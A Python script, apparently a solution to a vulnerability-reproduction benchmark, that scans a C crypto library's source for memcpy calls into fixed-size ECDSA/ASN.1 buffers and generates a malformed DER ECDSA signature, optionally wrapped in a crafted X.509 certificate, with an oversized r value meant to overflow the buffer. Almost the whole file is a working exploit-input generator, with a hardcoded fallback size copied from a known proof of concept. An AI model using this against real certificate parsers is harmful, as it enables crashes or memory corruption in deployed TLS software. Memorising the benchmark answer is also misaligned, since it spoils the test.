import os
import re
import ast
import tarfile
import zipfile
import tempfile
from typing import Dict, Optional, List, Tuple


def _read_bytes(path: str, limit: Optional[int] = None) -> bytes:
    with open(path, "rb") as f:
        if limit is None:
            return f.read()
        return f.read(limit)


def _read_text(path: str, limit: Optional[int] = None) -> str:
    data = _read_bytes(path, limit)
    return data.decode("utf-8", errors="ignore")


def _is_source_file(path: str) -> bool:
    lower = path.lower()
    return lower.endswith((".c", ".cc", ".cpp", ".h", ".hpp"))


def _strip_line_comment(s: str) -> str:
    i = s.find("//")
    if i >= 0:
        return s[:i]
    return s


def _strip_inline_block_comments(s: str) -> str:
    # Remove /* ... */ within a single line (common in defines)
    while True:
        a = s.find("/*")
        if a < 0:
            break
        b = s.find("*/", a + 2)
        if b < 0:
            s = s[:a]
            break
        s = s[:a] + s[b + 2 :]
    return s


_num_suffix_pat = re.compile(r"(\b0x[0-9A-Fa-f]+\b|\b\d+\b)(?:[uUlL]+)\b")


def _normalize_c_int_literals(expr: str) -> str:
    expr = _num_suffix_pat.sub(r"\1", expr)
    return expr


_cast_pat = re.compile(r"\(\s*[A-Za-z_]\w*(?:\s+\w+)*\s*(?:\*+\s*)?\)\s*")


def _remove_simple_casts(expr: str) -> str:
    # Heuristic: remove casts like (int), (size_t), (word32*), etc.
    return _cast_pat.sub("", expr)


class _SafeEval(ast.NodeVisitor):
    __slots__ = ("names", "ok")

    def __init__(self, names: Dict[str, int]):
        self.names = names
        self.ok = True

    def visit(self, node):
        if not self.ok:
            return None
        return super().visit(node)

    def visit_Expression(self, node: ast.Expression):
        return self.visit(node.body)

    def visit_Constant(self, node: ast.Constant):
        if isinstance(node.value, int):
            return int(node.value)
        self.ok = False
        return None

    def visit_Num(self, node: ast.Num):
        if isinstance(node.n, int):
            return int(node.n)
        self.ok = False
        return None

    def visit_Name(self, node: ast.Name):
        if node.id in self.names:
            return int(self.names[node.id])
        self.ok = False
        return None

    def visit_UnaryOp(self, node: ast.UnaryOp):
        v = self.visit(node.operand)
        if not self.ok:
            return None
        if isinstance(node.op, ast.USub):
            return -v
        if isinstance(node.op, ast.UAdd):
            return +v
        if isinstance(node.op, ast.Invert):
            return ~v
        self.ok = False
        return None

    def visit_BinOp(self, node: ast.BinOp):
        l = self.visit(node.left)
        r = self.visit(node.right)
        if not self.ok:
            return None
        op = node.op
        if isinstance(op, ast.Add):
            return l + r
        if isinstance(op, ast.Sub):
            return l - r
        if isinstance(op, ast.Mult):
            return l * r
        if isinstance(op, (ast.FloorDiv, ast.Div)):
            if r == 0:
                self.ok = False
                return None
            return l // r
        if isinstance(op, ast.Mod):
            if r == 0:
                self.ok = False
                return None
            return l % r
        if isinstance(op, ast.LShift):
            return l << r
        if isinstance(op, ast.RShift):
            return l >> r
        if isinstance(op, ast.BitOr):
            return l | r
        if isinstance(op, ast.BitAnd):
            return l & r
        if isinstance(op, ast.BitXor):
            return l ^ r
        self.ok = False
        return None

    def generic_visit(self, node):
        self.ok = False
        return None


def _eval_int_expr(expr: str, names: Dict[str, int]) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    if "sizeof" in expr:
        return None
    expr = _strip_line_comment(expr)
    expr = _strip_inline_block_comments(expr)
    expr = _normalize_c_int_literals(expr)
    expr = _remove_simple_casts(expr)
    expr = expr.strip().strip(";").strip()
    if not expr:
        return None
    expr = expr.replace("(", " ( ").replace(")", " ) ")
    expr = re.sub(r"\s+", " ", expr).strip()
    try:
        tree = ast.parse(expr, mode="eval")
    except Exception:
        return None
    ev = _SafeEval(names)
    try:
        v = ev.visit(tree)
    except Exception:
        return None
    if not ev.ok or v is None:
        return None
    try:
        v = int(v)
    except Exception:
        return None
    return v


def _collect_constants_from_text(text: str, names: Dict[str, int]) -> None:
    # #define NAME value
    define_pat = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*)(\s*\((.*?)\))?\s+(.*)$", re.M)
    for m in define_pat.finditer(text):
        name = m.group(1)
        is_func_like = m.group(2) is not None
        if is_func_like:
            continue
        val = m.group(4)
        val = _strip_line_comment(val)
        val = _strip_inline_block_comments(val).strip()
        if not val:
            continue
        if "\\" in val:
            continue
        v = _eval_int_expr(val, names)
        if v is not None:
            names.setdefault(name, v)

    # enum { A = 1, B = 2, ... };
    enum_pat = re.compile(r"\benum\b[^;{]*\{([^}]*)\}", re.S)
    for m in enum_pat.finditer(text):
        body = m.group(1)
        parts = body.split(",")
        for p in parts:
            p = _strip_line_comment(_strip_inline_block_comments(p)).strip()
            if not p:
                continue
            m2 = re.match(r"^\s*([A-Za-z_]\w*)\s*(?:=\s*(.*))?$", p)
            if not m2:
                continue
            name = m2.group(1)
            expr = m2.group(2)
            if expr is None:
                continue
            v = _eval_int_expr(expr, names)
            if v is not None:
                names.setdefault(name, v)

    # static const int NAME = expr; (and similar)
    const_pat = re.compile(
        r"\b(?:static\s+)?(?:const\s+)?(?:unsigned\s+)?(?:int|long|short|size_t|uint32_t|uint16_t|uint8_t)\s+([A-Za-z_]\w*)\s*=\s*([^;]+);"
    )
    for m in const_pat.finditer(text):
        name = m.group(1)
        expr = m.group(2)
        v = _eval_int_expr(expr, names)
        if v is not None:
            names.setdefault(name, v)


def _extract_archive(src_path: str, out_dir: str) -> str:
    if os.path.isdir(src_path):
        return src_path
    if tarfile.is_tarfile(src_path):
        with tarfile.open(src_path, "r:*") as tf:
            tf.extractall(out_dir)
    elif zipfile.is_zipfile(src_path):
        with zipfile.ZipFile(src_path, "r") as zf:
            zf.extractall(out_dir)
    else:
        raise ValueError("Unsupported input path (not dir/tar/zip)")
    entries = [os.path.join(out_dir, x) for x in os.listdir(out_dir)]
    dirs = [e for e in entries if os.path.isdir(e)]
    if len(dirs) == 1:
        return dirs[0]
    return out_dir


def _find_harness_text(root: str) -> str:
    best = ""
    best_score = -1
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            p = os.path.join(dirpath, fn)
            if not _is_source_file(p):
                continue
            try:
                txt = _read_text(p, limit=512 * 1024)
            except Exception:
                continue
            if "LLVMFuzzerTestOneInput" in txt:
                score = 100
                if "x509" in txt.lower() or "certificate" in txt.lower():
                    score += 20
                if score > best_score:
                    best_score = score
                    best = txt
            elif re.search(r"\bint\s+main\s*\(", txt):
                score = 10
                low = txt.lower()
                if "stdin" in low or "fread" in low:
                    score += 5
                if "x509" in low or "certificate" in low:
                    score += 10
                if "ecdsa" in low and ("asn" in low or "signature" in low):
                    score += 10
                if score > best_score:
                    best_score = score
                    best = txt
    return best


def _infer_mode(harness_text: str, root: str) -> str:
    low = (harness_text or "").lower()
    if low:
        x509_hits = 0
        sig_hits = 0
        for kw in ("x509", "certificate", "crt", "cert_parse", "x509_crt_parse", "parse_crt", "x509parse"):
            if kw in low:
                x509_hits += 1
        for kw in ("ecdsa_sig", "d2i_ecdsa_sig", "ecdsa", "signature", "asn1", "asn.1"):
            if kw in low:
                sig_hits += 1
        if x509_hits >= 2 and x509_hits >= sig_hits:
            return "x509"
        if "x509" in low and ("parse" in low or "crt" in low or "cert" in low):
            return "x509"
        if "ecdsa" in low and ("sig" in low or "signature" in low or "asn" in low):
            return "sig"

    # Fallback: repository scan for strong x509 fuzz target clues
    repo_x509 = 0
    repo_sig = 0
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            p = os.path.join(dirpath, fn)
            if not _is_source_file(p):
                continue
            base = fn.lower()
            if "x509" in base or "cert" in base:
                repo_x509 += 1
            if "ecdsa" in base or "ecc" in base:
                repo_sig += 1
            if repo_x509 >= 5 or repo_sig >= 5:
                break
    if repo_x509 > repo_sig + 2:
        return "x509"
    return "sig"


_FUNC_HEAD_PAT = re.compile(
    r"^\s*(?:static\s+|extern\s+|inline\s+|__inline\s+|__inline__\s+)?[A-Za-z_][\w\s\*\(\),]*?\b([A-Za-z_]\w*)\s*\([^;{}]*\)\s*\{",
    re.M,
)

_ARRAY_DECL_PAT = re.compile(
    r"\b(?:const\s+)?(?:unsigned\s+)?(?:char|signed\s+char|uint8_t|int8_t|byte|BYTE|u8|word8|Word8|WOLFSSL_BYTE)\s+([A-Za-z_]\w*)\s*\[\s*([^\]\n]+)\s*\]"
)


def _iter_functions(text: str) -> List[Tuple[str, str]]:
    funcs = []
    for m in _FUNC_HEAD_PAT.finditer(text):
        name = m.group(1)
        if name in ("if", "for", "while", "switch"):
            continue
        start = m.start()
        brace_pos = text.find("{", m.end() - 1)
        if brace_pos < 0:
            continue
        i = brace_pos
        depth = 0
        n = len(text)
        while i < n:
            c = text[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    body = text[brace_pos + 1 : i]
                    funcs.append((name, body))
                    break
            i += 1
    return funcs


def _find_calls(body: str, call_names: Tuple[str, ...]) -> List[Tuple[str, List[str]]]:
    # Return list of (call_name, args_list)
    out = []
    low = body
    for call in call_names:
        idx = 0
        while True:
            pos = low.find(call + "(", idx)
            if pos < 0:
                break
            j = pos + len(call)
            if j >= len(low) or low[j] != "(":
                idx = pos + 1
                continue
            k = j + 1
            depth = 1
            while k < len(low) and depth > 0:
                ch = low[k]
                if ch == "(":
                    depth += 1
                elif ch == ")":
                    depth -= 1
                k += 1
            if depth != 0:
                idx = pos + 1
                continue
            args_str = body[j + 1 : k - 1]
            args = []
            cur = []
            d = 0
            in_s = None
            esc = False
            for ch in args_str:
                if in_s:
                    cur.append(ch)
                    if esc:
                        esc = False
                    elif ch == "\\":
                        esc = True
                    elif ch == in_s:
                        in_s = None
                    continue
                if ch in ("'", '"'):
                    in_s = ch
                    cur.append(ch)
                    continue
                if ch == "(":
                    d += 1
                    cur.append(ch)
                    continue
                if ch == ")":
                    if d > 0:
                        d -= 1
                    cur.append(ch)
                    continue
                if ch == "," and d == 0:
                    args.append("".join(cur).strip())
                    cur = []
                    continue
                cur.append(ch)
            if cur:
                args.append("".join(cur).strip())
            out.append((call, args))
            idx = k
    return out


def _extract_dest_identifier(arg0: str, locals_map: Dict[str, int]) -> Optional[str]:
    ids = re.findall(r"[A-Za-z_]\w*", arg0)
    for ident in reversed(ids):
        if ident in locals_map:
            return ident
    return None


def _detect_overflow_size(root: str, mode: str) -> Optional[int]:
    # Gather constants
    constants: Dict[str, int] = {}
    relevant_files: List[str] = []

    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            p = os.path.join(dirpath, fn)
            if not _is_source_file(p):
                continue
            lfn = fn.lower()
            if "ecdsa" in lfn or "ecc" in lfn or "asn" in lfn or (mode == "x509" and ("x509" in lfn or "cert" in lfn)):
                relevant_files.append(p)

    # If nothing matched by name, consider all sources
    if not relevant_files:
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                p = os.path.join(dirpath, fn)
                if _is_source_file(p):
                    relevant_files.append(p)

    # Parse constants from relevant files
    for p in relevant_files:
        try:
            txt = _read_text(p, limit=512 * 1024)
        except Exception:
            continue
        _collect_constants_from_text(txt, constants)

    # Scan functions for memcpy into local arrays
    copy_names = ("memcpy", "memmove", "XMEMCPY", "XMEMMOVE", "os_memcpy", "wolfSSL_memcpy", "bcopy")
    candidates: List[Tuple[int, int, str, str, str]] = []
    # tuple: (relevance, size, dest_name, func_name, len_expr)

    for p in relevant_files:
        try:
            txt = _read_text(p, limit=1024 * 1024)
        except Exception:
            continue
        lowtxt = txt.lower()
        if "ecdsa" not in lowtxt and "ecc" not in lowtxt and "asn" not in lowtxt and (mode != "x509" or "x509" not in lowtxt):
            continue

        for func_name, body in _iter_functions(txt):
            body_low = body.lower()
            if "ecdsa" not in body_low and "ecc" not in body_low and "asn" not in body_low:
                continue

            locals_map: Dict[str, int] = {}
            for m in _ARRAY_DECL_PAT.finditer(body):
                var = m.group(1)
                expr = m.group(2)
                sz = _eval_int_expr(expr, constants)
                if sz is None:
                    continue
                if 1 <= sz <= 2_000_000:
                    locals_map[var] = int(sz)

            if not locals_map:
                continue

            calls = _find_calls(body, copy_names)
            for call, args in calls:
                if len(args) < 3:
                    continue
                dest = _extract_dest_identifier(args[0], locals_map)
                if not dest:
                    continue
                sz = locals_map.get(dest)
                if not sz or sz <= 0:
                    continue
                len_expr = args[2]
                le = len_expr.strip().lower()
                if "sizeof" in le:
                    continue
                if dest.lower() in le and "sizeof" in le:
                    continue
                # If constant length <= size, skip
                len_val = _eval_int_expr(len_expr, constants)
                if len_val is not None and 0 <= len_val <= sz:
                    continue

                relevance = 0
                dlow = dest.lower()
                if dlow in ("r", "s"):
                    relevance += 8
                if dlow.startswith("r") or dlow.startswith("s") or "rs" in dlow:
                    relevance += 3
                if "sig" in dlow or "sign" in dlow:
                    relevance += 3
                if "asn" in body_low:
                    relevance += 3
                if "ecdsa" in body_low or "ecc" in body_low:
                    relevance += 3
                if "rlen" in le or "slen" in le:
                    relevance += 3
                if dlow.startswith("r") and ("rlen" in le or "r_len" in le):
                    relevance += 3
                if dlow.startswith("s") and ("slen" in le or "s_len" in le):
                    relevance += 3
                if mode == "x509" and ("x509" in body_low or "cert" in body_low):
                    relevance += 1

                # Prefer plausibly signature-related buffers: sizes not too tiny
                if sz < 8:
                    continue
                candidates.append((relevance, sz, dest, func_name, len_expr))

    if not candidates:
        return None

    # Choose best: highest relevance, then smallest size among top relevance class
    candidates.sort(key=lambda t: (-t[0], t[1]))
    best_rel = candidates[0][0]
    top = [c for c in candidates if c[0] == best_rel]
    top.sort(key=lambda t: t[1])
    best = top[0]
    return int(best[1])


def _der_len(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative length")
    if n < 128:
        return bytes([n])
    b = []
    x = n
    while x > 0:
        b.append(x & 0xFF)
        x >>= 8
    b.reverse()
    return bytes([0x80 | len(b)]) + bytes(b)


def _der_tlv(tag: int, content: bytes) -> bytes:
    return bytes([tag]) + _der_len(len(content)) + content


def _der_oid(oid: str) -> bytes:
    parts = [int(x) for x in oid.split(".")]
    if len(parts) < 2:
        raise ValueError("bad oid")
    first = 40 * parts[0] + parts[1]
    out = [first]
    for v in parts[2:]:
        if v == 0:
            out.append(0)
            continue
        enc = []
        while v > 0:
            enc.append(v & 0x7F)
            v >>= 7
        enc.reverse()
        for i in range(len(enc) - 1):
            out.append(enc[i] | 0x80)
        out.append(enc[-1])
    return _der_tlv(0x06, bytes(out))


def _der_integer_bytes(val: bytes) -> bytes:
    if not val:
        val = b"\x00"
    # Ensure positive (if MSB set, prefix 0x00)
    if val[0] & 0x80:
        val = b"\x00" + val
    return _der_tlv(0x02, val)


def _der_sequence(content: bytes) -> bytes:
    return _der_tlv(0x30, content)


def _der_set(content: bytes) -> bytes:
    return _der_tlv(0x31, content)


def _der_printable_string(s: bytes) -> bytes:
    return _der_tlv(0x13, s)


def _der_utctime(s: bytes) -> bytes:
    return _der_tlv(0x17, s)


def _der_bit_string(data: bytes, unused_bits: int = 0) -> bytes:
    if not (0 <= unused_bits <= 7):
        unused_bits = 0
    return _der_tlv(0x03, bytes([unused_bits]) + data)


def _make_ecdsa_sig(r_len: int, s_len: int = 1) -> bytes:
    if r_len < 1:
        r_len = 1
    if s_len < 1:
        s_len = 1
    r_val = b"\x01" * r_len
    s_val = b"\x01" * s_len
    r_tlv = bytes([0x02]) + _der_len(len(r_val)) + r_val
    s_tlv = bytes([0x02]) + _der_len(len(s_val)) + s_val
    return bytes([0x30]) + _der_len(len(r_tlv) + len(s_tlv)) + r_tlv + s_tlv


def _make_name_cn_a() -> bytes:
    # Name ::= SEQUENCE { SET { SEQUENCE { OID cn, PrintableString 'a' } } }
    atv = _der_sequence(_der_oid("2.5.4.3") + _der_printable_string(b"a"))
    rdn = _der_set(atv)
    return _der_sequence(rdn)


def _make_spki_p256() -> bytes:
    # AlgorithmIdentifier for ecPublicKey with prime256v1
    alg = _der_sequence(_der_oid("1.2.840.10045.2.1") + _der_oid("1.2.840.10045.3.1.7"))
    # SubjectPublicKey BIT STRING, uncompressed point 0x04 + 64 zeros
    pubkey = b"\x04" + (b"\x00" * 64)
    bs = _der_bit_string(pubkey, 0)
    return _der_sequence(alg + bs)


def _make_alg_ecdsa_sha256() -> bytes:
    # ecdsa-with-SHA256 OID 1.2.840.10045.4.3.2, no parameters
    return _der_sequence(_der_oid("1.2.840.10045.4.3.2"))


def _make_tbs_certificate(sig_alg: bytes) -> bytes:
    version_v3 = bytes([0xA0]) + _der_len(3) + bytes([0x02, 0x01, 0x02])  # [0] EXPLICIT INTEGER 2
    serial = _der_integer_bytes(b"\x01")
    issuer = _make_name_cn_a()
    subject = _make_name_cn_a()
    validity = _der_sequence(_der_utctime(b"250101000000Z") + _der_utctime(b"260101000000Z"))
    spki = _make_spki_p256()
    tbs = version_v3 + serial + sig_alg + issuer + validity + subject + spki
    return _der_sequence(tbs)


def _make_certificate_with_sig(sig_der: bytes) -> bytes:
    sig_alg = _make_alg_ecdsa_sha256()
    tbs = _make_tbs_certificate(sig_alg)
    sig_value = _der_bit_string(sig_der, 0)
    return _der_sequence(tbs + sig_alg + sig_value)


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            root = _extract_archive(src_path, td)
            harness = _find_harness_text(root)
            mode = _infer_mode(harness, root)

            best_size = _detect_overflow_size(root, mode)
            if best_size is not None and best_size > 0:
                r_len = best_size + 1
                # Avoid pathological tiny values; keep below 1 byte short-form only if needed.
                if r_len < 33:
                    r_len = 33
                # Keep within a reasonable range unless the code suggests otherwise.
                if r_len > 200000:
                    r_len = 200000
            else:
                # Conservative fallback close to provided ground-truth PoC size.
                r_len = 41750

            sig = _make_ecdsa_sig(r_len=r_len, s_len=1)

            if mode == "x509":
                return _make_certificate_with_sig(sig)
            return sig